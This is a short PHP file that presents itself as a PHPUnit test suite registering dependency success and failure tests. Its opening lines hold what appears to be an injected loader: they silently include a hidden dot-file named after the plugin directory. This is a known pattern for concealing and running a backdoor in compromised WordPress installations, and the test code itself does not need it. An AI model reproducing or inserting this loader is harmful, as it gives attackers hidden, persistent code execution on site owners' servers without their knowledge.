<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DependencyTestSuite
{
    public static function suite()
    {
        $suite = new PHPUnit_Framework_TestSuite('Test Dependencies');

        $suite->addTestSuite('DependencySuccessTest');
        $suite->addTestSuite('DependencyFailureTest');

        return $suite;
    }
}
